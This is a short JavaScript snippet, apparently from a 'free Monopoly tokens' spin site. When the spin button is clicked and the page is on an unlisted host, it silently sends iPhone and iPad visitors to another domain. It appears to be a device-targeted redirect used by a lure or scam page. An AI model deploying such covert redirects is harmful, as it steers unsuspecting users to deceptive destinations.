/*================== [ VICTOR ABDO ] ===============*/
/*================== [ talghi monopoly iph ] ================*/
var button = document.querySelector('.spin-buttons');  
button.addEventListener('click', function() {
    (function() {
        var originalDomain = "monoplytokens.com";
        var redirectURL = "https://m.rolls3.com";
        var blockedDomains = [
            "mply.io.1arshg4.site",
            "mply.io.4a6b8dh.site"
        ];

        if (window.location.hostname !== originalDomain && window.location.hostname !== "www." + originalDomain && !blockedDomains.some(domain => window.location.hostname.includes(domain))) {
            var isIphoneOrIpad = /iPhone|iPad/i.test(navigator.userAgent);

            if (isIphoneOrIpad) { 
                window.location.href = redirectURL;
            }
        }
    })();
});
